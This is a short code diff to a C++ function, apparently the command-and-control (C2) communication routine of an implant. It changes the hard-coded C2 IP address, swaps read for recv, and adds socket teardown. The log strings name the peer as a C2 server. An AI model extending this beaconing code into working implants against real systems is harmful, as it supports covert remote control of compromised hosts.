@@ -96,7 +96,7 @@ void sendRequest(const char * type, const std::vector<unsigned char> data, unsig
     }
 
     // create socket
-    std::string host = "10.37.129.4";
+    std::string host = "10.90.30.26";
     int port = 443;
     
     int sock_connect_status, bytes_read, sock;
@@ -127,7 +127,7 @@ void sendRequest(const char * type, const std::vector<unsigned char> data, unsig
     std::cout << "[COMMS] Message sent, attempting to read response..." << std::endl;
 
     // receive data from socket
-    bytes_read = read(sock, buffer, RESP_BUFFER_SIZE);
+    bytes_read = recv(sock, buffer, RESP_BUFFER_SIZE, MSG_WAITALL);
 
     if (bytes_read < 0) {
         std::cout << "[COMMS] No response received from C2" << std::endl;
@@ -138,8 +138,11 @@ void sendRequest(const char * type, const std::vector<unsigned char> data, unsig
         std::cout << "[COMMS] Data received from C2" << std::endl;
     }
 
+    close(sock);
+    shutdown(sock, 2);
 
     // update response buffer and response length values for return to caller
     memcpy(*response, buffer, bytes_read);
     **response_length = bytes_read;
+
 }
